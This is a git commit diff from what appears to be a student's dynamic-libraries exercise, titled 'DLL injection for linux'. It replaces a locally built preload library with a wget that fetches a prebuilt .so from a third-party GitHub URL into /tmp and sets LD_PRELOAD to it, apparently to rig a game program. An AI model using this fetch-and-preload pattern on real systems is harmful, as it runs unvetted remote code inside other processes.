78d31480ab690663f5182cf45a816fc0c5675095
Obelem <ibbraidejesse@gmail.com>
2022-07-13 05:41:21 +0100

    DLL injection for linux

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-gcc -Wall -fPIC -shared -o libc.so libc.c
-LD_PRELOAD=$PWD/libc.so ./gm
+wget -P /tmp/ https://raw.github.com/luischaparroc/holbertonschool-low_level_programming/master/0x18-dynamic_libraries/nrandom.so
+export LD_PRELOAD=/tmp/nrandom.so
